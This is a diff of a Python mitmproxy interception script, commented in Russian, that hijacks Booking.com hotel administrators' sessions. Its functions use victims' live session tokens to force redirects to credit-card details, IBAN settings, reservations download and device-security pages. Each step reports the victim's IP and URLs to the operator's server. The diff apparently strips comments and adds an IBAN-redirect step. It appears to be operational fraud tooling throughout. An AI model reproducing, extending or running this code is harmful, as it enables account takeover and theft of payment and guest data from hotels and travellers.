                     os.remove(CUSTOM_REDIRECT_FROM_FILE)
                 if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
@@ -1388,10 +1568,10 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F17] Traceback: {traceback.format_exc()}")
         return False
 
+# ========== ФУНКЦИЯ 19 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 19:
-    Редиректит все запросы к admin.booking.com → secure-admin.booking.com/booking_cc_details.html
+    ФУНКЦИЯ 19: Credit card details redirect
     """
     try:
         if not should_booking_cc_details():
@@ -1400,10 +1580,7 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
         
-        # ====== ВАЖНОЕ ИСПРАВЛЕНИЕ: ПРОВЕРКА secure-admin ======
-        # Если пользователь УЖЕ на secure-admin.booking.com - НЕ делаем редирект
         if host.startswith("secure-admin.") and host.endswith("booking.com"):
-            # Это уже целевой домен - проверяем завершение функции
             url_lower = url.lower()
             required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
             has_all_params = all(param in url_lower for param in required_params)
@@ -1416,11 +1593,8 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
                 send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                 log(f"[F19] ✓ Completion notification sent")
             
-            # ВАЖНО: НЕ делаем редирект если уже на secure-admin!
             return False
         
-        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ ======
-        # (этот блок нужен на случай если пользователь пришел по прямой ссылке)
         if "secure-admin.booking.com/booking_cc_details.html" in url.lower():
             url_lower = url.lower()
             required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
@@ -1437,32 +1611,25 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
             
             return False
         
-        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
-        # Редиректим ТОЛЬКО admin.booking.com (сабдомен admin)
         if not host.startswith("admin.") or not host.endswith("booking.com"):
             return False
         
-        # Проверяем, не идет ли уже с booking_cc_details.html
         referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
         if referer and "secure-admin.booking.com/booking_cc_details.html" in referer.lower():
             return False
         
-        # ⚠️ ФИЛЬТРАЦИЯ: Не редиректим статические файлы
         if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
             return False
         
-        # Проверяем, что это HTML запрос
         accept = flow.request.headers.get("Accept", "").lower()
         if not ("text/html" in accept or flow.request.method == "GET"):
             return False
         
         log(f"[F19] This is admin.booking.com request - making primary redirect")
         
-        # Получаем параметры из конфигурации
         bn = get_booking_cc_details_bn()
         hotel_id_config = get_booking_cc_details_hotel_id()
         
-        # Получаем язык
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         lang = query.get("lang", ["en"])[0]
@@ -1480,7 +1647,6 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"[F19] Using bn={bn}, hotel_id={hotel_id_config}, lang={lang}")
         
-        # Формируем целевой URL
         target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id_config};has_bvc=1"
         
         if url == target_url:
@@ -1488,11 +1654,9 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
         
-        # Логируем редирект
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
         
-        # Выполняем редирект
         flow.response = http.Response.make(
             302, 
             b"", 
@@ -1511,10 +1675,10 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         log(f"[F19] Traceback: {traceback.format_exc()}")
         return False
 
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 21 ==========
+# ========== ФУНКЦИЯ 21 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def partners_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 21: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
+    ФУНКЦИЯ 21: Partners redirect
     """
     try:
         if not should_partners():
@@ -1527,10 +1691,7 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
         if not host.endswith("admin.booking.com"):
             return False
 
-        if any(ext in url_l for ext in [
-            '.css', '.js', '.png', '.jpg', '.jpeg', '.gif',
-            '.ico', '.woff', '.woff2', '.ttf', '.svg'
-        ]):
+        if any(ext in url_l for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
             return False
 
         parsed = urllib.parse.urlparse(url)
@@ -1556,7 +1717,6 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
             if m:
                 hotel_id = m.group(1)
 
-        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
             log("Function 21: ⚠️ No ses parameter - user not authenticated, skipping redirect")
             return False
@@ -1570,7 +1730,6 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
             f"channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
         )
 
-        # Проверка завершения
         completed = False
 
         if "tlc=" in url_l:
@@ -1609,11 +1768,10 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
         log(traceback.format_exc())
         return False
 
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 23 (БЕЗОПАСНАЯ) ==========
+# ========== ФУНКЦИЯ 23 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def device_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 23: РАБОТАЕТ ТОЛЬКО С admin.booking.com И ТОЛЬКО С ЖИВОЙ СЕССИЕЙ
-    Полностью исключает редиректы с account.booking.com
+    ФУНКЦИЯ 23: Device security redirect
     """
     try:
         if not should_device():
@@ -1622,20 +1780,15 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
         
-        # ====== КРИТИЧЕСКИ ВАЖНО: НИКОГДА НЕ РЕДИРЕКТИМ account.booking.com ======
         if host.endswith("account.booking.com"):
-            # Просто игнорируем - никаких редиректов!
             return False
         
-        # ====== РАБОТАЕМ ТОЛЬКО С admin.booking.com ======
         if not host.endswith("admin.booking.com"):
             return False
         
-        # Пропускаем статические файлы
         if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
             return False
         
-        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ ======
         if "auth_assurance_last_check=" in url.lower():
             log("Function 23: ✓ Detected auth_assurance_last_check -> COMPLETED")
             client_ip = get_client_ip(flow)
@@ -1647,25 +1800,21 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
             
             remove_device_flag()
             
-            # Редирект на главную после завершения
             target_url = "https://admin.booking.com/hotel/hoteladmin/"
             flow.response = http.Response.make(302, b"", {"Location": target_url})
             return True
         
-        # ====== ЕСЛИ МЫ УЖЕ НА СТРАНИЦЕ devices.html ======
         if "security/devices.html" in url:
             parsed = urllib.parse.urlparse(url)
             query = urllib.parse.parse_qs(parsed.query)
             
-            # Проверяем наличие параметров
             if "hotel_id" in query and "ses" in query:
                 log("Function 23: On devices.html with all params, waiting for auth_assurance_last_check")
-                return False  # Ждём завершения
+                return False
             
             log("Function 23: On devices.html but missing params - waiting")
             return False
         
-        # ====== ПОЛУЧАЕМ ПАРАМЕТРЫ ======
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         
@@ -1673,13 +1822,11 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         ses = query.get("ses", [None])[0]
         lang = query.get("lang", ["en"])[0]
         
-        # Пробуем найти hotel_id в пути
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
         
-        # ====== БЕЗ SES ИЛИ HOTEL_ID - НИКАКИХ РЕДИРЕКТОВ ======
         if not ses:
             log("Function 23: ⚠️ No ses parameter - waiting for authentication, NO REDIRECT")
             return False
@@ -1688,22 +1835,17 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
             log("Function 23: ⚠️ No hotel_id parameter - NO REDIRECT")
             return False
         
-        # ====== ПРОВЕРЯЕМ, НЕ НА ХОСТЕ ЛИ ЛОГИНА ======
-        # Дополнительная защита: если в реферере есть account.booking.com - не редиректим
         referer = flow.request.headers.get("Referer") or ""
         if "account.booking.com" in referer.lower():
-            log("Function 23: ⚠️ Coming from login page - session might be new, waiting")
+            log("Function 23: ⚠️ Coming from login page - waiting")
             return False
         
-        # ====== ФОРМИРУЕМ ЦЕЛЕВОЙ URL ======
         target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/security/devices.html?lang={lang}&ses={ses}&hotel_id={hotel_id}"
         
-        # Проверяем, не на той же странице
         if url == target_url:
             log("Function 23: Already on correct devices page")
             return False
         
-        # ====== ВЫПОЛНЯЕМ РЕДИРЕКТ (ТОЛЬКО ЕСЛИ ВСЁ ХОРОШО) ======
         log(f"Function 23: Device redirect {url} -> {target_url}")
         
         client_ip = get_client_ip(flow)
@@ -1718,55 +1860,35 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         log(f"Traceback: {traceback.format_exc()}")
         return False
 
+# ========== ФУНКЦИЯ 24 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def pulse_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 24: ИСПРАВЛЕННАЯ ВЕРСИЯ
-    РЕШЕНИЕ: НЕ редиректим account.booking.com когда Pulse отключен
+    ФУНКЦИЯ 24: Pulse redirect
     """
     try:
-        # ========== ВАЖНОЕ ИСПРАВЛЕНИЕ ==========
-        # РАНЬШЕ: когда Pulse отключен → все равно редиректим account.booking.com
-        # СЕЙЧАС: когда Pulse отключен → НИЧЕГО НЕ ДЕЛАЕМ!
-        
-        # Только если Pulse АКТИВЕН
         if not should_pulse():
-            return False  # ⚠️ КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ!
+            return False
         
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
         
-        # ========== РЕЖИМ: PULSE АКТИВЕН ==========
-        # Редиректим только admin.booking.com
         if not host.startswith("admin.") or not host.endswith("booking.com"):
             return False
         
-        # Получаем целевой URL из конфигурации
         target_url = get_pulse_redirect_to()
         if not target_url:
             log("Function 24: No target URL configured")
             return False
         
-        # Проверяем, что это не редирект на ту же страницу
         if url == target_url:
             return False
         
         log(f"Function 24: Pulse redirect {url} -> {target_url}")
         
-        # Логируем
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_24_PULSE")
         
-        # Выполняем редирект
-        flow.response = http.Response.make(
-            302,
-            b"",
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
         return True
         
     except Exception as e:
@@ -1775,10 +1897,10 @@ def pulse_redirect(flow: http.HTTPFlow) -> bool:
         log(f"Traceback: {traceback.format_exc()}")
         return False
 
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 25 ==========
+# ========== ФУНКЦИЯ 25 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 25: ULTRA PULSE - ТЕПЕРЬ ПОНИМАЕТ, КОГДА ФУНКЦИИ НЕ МОГУТ РАБОТАТЬ
+    ФУНКЦИЯ 25: Ultra Pulse
     """
     try:
         if not should_ultra_pulse():
@@ -1786,11 +1908,9 @@ def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"Function 25: Ultra Pulse active")
         
-        # Фаза 1: Device
         if should_device():
             log(f"Function 25: Phase 1 (Device) active")
             
-            # Проверяем, есть ли ses в URL
             if 'ses=' not in flow.request.pretty_url:
                 log("Function 25: ⚠️ Device phase waiting for ses parameter")
                 return False
@@ -1799,14 +1919,12 @@ def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
                 log(f"Function 25: Executed Function 23 (Device) redirect")
                 return True
         
-        # Фаза 2: Pulse
         if should_pulse():
             log(f"Function 25: Phase 2 (Pulse) active")
             if pulse_redirect(flow):
                 log(f"Function 25: Executed Function 24 (Pulse) redirect")
                 return True
         
-        # Если обе функции завершены
         if not should_device() and not should_pulse():
             log(f"Function 25: Both phases completed - removing Ultra Pulse flag")
             remove_ultra_pulse_flag()
@@ -1839,27 +1957,23 @@ def check_autostart():
 # Главная точка входа
 def request(flow: http.HTTPFlow) -> None:
     """
-    ГЛАВНАЯ ФУНКЦИЯ MITMproxy - С ДОБАВЛЕННОЙ ФУНКЦИЕЙ 27
-    Функция 26 работает ПАРАЛЛЕЛЬНО с другими функциями!
+    ГЛАВНАЯ ФУНКЦИЯ MITMproxy
     """
     
     url = flow.request.pretty_url
     host = (flow.request.pretty_host or "").lower()
     
-    # ========== ФУНКЦИЯ 26: Мониторинг платформ - РАБОТАЕТ ПАРАЛЛЕЛЬНО ==========
-    # ВАЖНО: НЕ возвращаем True, просто логируем и продолжаем выполнение!
+    # ========== ФУНКЦИЯ 26: Мониторинг платформ ==========
     if should_monitor_platforms() and should_log_domain(flow):
         try:
             client_ip = get_client_ip(flow)
             from_url = flow.request.pretty_url
             log_redirect_to_server(client_ip, from_url, "MONITORED", "DOMAIN_MONITOR")
             log(f"[F26] ✓ Platform access logged: {host}")
-            # НЕ ВОЗВРАЩАЕМ True - продолжаем проверять другие функции!
         except Exception as e:
             log(f"Error in domain monitoring: {e}")
     
     # ========== ПРОВЕРКА АВТОЗАПУСКА ==========
-    # Выполняется только один раз при первом запросе
     if not hasattr(flow, '_autostart_checked'):
         check_autostart()
         flow._autostart_checked = True
@@ -1868,26 +1982,28 @@ def request(flow: http.HTTPFlow) -> None:
     if custom_redirect(flow):
         return
     
-    # ========== ПРИОРИТЕТ 2: ФУНКЦИЯ 18 (Reservations download) ==========
+    # ========== ПРИОРИТЕТ 3: ФУНКЦИЯ 14 (IBAN Settings Force) ==========
+    if host.endswith("admin.booking.com"):
+        if booking_iban_settings_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 4: ФУНКЦИЯ 18 (Reservations download) ==========
     if host.endswith("admin.booking.com"):
         if booking_reservations_download_redirect(flow):
             return
     
-    # ========== ПРИОРИТЕТ 2.5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
-    # НОВАЯ ФУНКЦИЯ С ПОЛНЫМ ЛОГИРОВАНИЕМ
-    # ВАЖНО: ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!
+    # ========== ПРИОРИТЕТ 5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
     if host.endswith("admin.booking.com"):
         if booking_reservations_cycle_redirect(flow):
             return
     
-    # ========== ПРИОРИТЕТ 3: ФУНКЦИЯ 19 (CC details) ==========
+    # ========== ПРИОРИТЕТ 6: ФУНКЦИЯ 19 (CC details) ==========
     if host.endswith("booking.com"):
         if booking_cc_details_redirect(flow):
             return
     
-    # ========== ПРИОРИТЕТ 4: BOOKING РЕДИРЕКТЫ 13-16 ==========
+    # ========== ПРИОРИТЕТ 7: BOOKING РЕДИРЕКТЫ 13-16 ==========
     if host.endswith("admin.booking.com"):
-        # Функции 13 и 15 теперь с правильными проверками
         if booking_hotel_security_redirect(flow):
             return
             
@@ -1903,9 +2019,7 @@ def request(flow: http.HTTPFlow) -> None:
         if booking_redirect(flow, "security"):
             return
     
-    # ========== ПРИОРИТЕТ 5: ФУНКЦИИ 21-23 (с реальными параметрами) ==========
-    # Эти функции работают ТОЛЬКО для admin.booking.com
-    
+    # ========== ПРИОРИТЕТ 8: ФУНКЦИИ 21-23 ==========
     if host.endswith("admin.booking.com"):
         if should_partners():
             if partners_redirect(flow):
@@ -1915,14 +2029,11 @@ def request(flow: http.HTTPFlow) -> None:
             if device_redirect(flow):
                 return
         
-        # Функция 22 (Partners + Messaging)
         if should_partners_and_mess():
             if should_partners() and partners_redirect(flow):
                 return
     
-    # ========== ПРИОРИТЕТ 6: ФУНКЦИИ 24-25 (PULSE) ==========
-    # ⚠️ ВАЖНО: Pulse проверяется ПОСЛЕ других функций 21-23
-    
+    # ========== ПРИОРИТЕТ 9: ФУНКЦИИ 24-25 ==========
     if should_pulse():
         if pulse_redirect(flow):
             return
@@ -1931,20 +2042,16 @@ def request(flow: http.HTTPFlow) -> None:
         if ultra_pulse_redirect(flow):
             return
     
-    # ========== ПРИОРИТЕТ 7: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
+    # ========== ПРИОРИТЕТ 10: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
     redirect_target = get_redirect_target()
     
     if not redirect_target:
-        # Если redirect_target пустой - НЕ выполняем обычные редиректы
-        # Это предотвращает ломание интернета
         return
     
-    # Пропускаем если это сам таргет
     if is_redirect_target(flow, redirect_target):
         log(f"skip redirect for target itself: {flow.request.pretty_url}")
         return
     
-    # Обычные редиректы (только если есть таргет)
     if should_force():
         log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
         client_ip = get_client_ip(flow)
@@ -1962,7 +2069,6 @@ def request(flow: http.HTTPFlow) -> None:
         remove_one_shot_flag()
         return
 
-    # Cookie-based редирект
     try:
         cookie_present = bool(flow.request.cookies.get(COOKIE))
         if cookie_present:
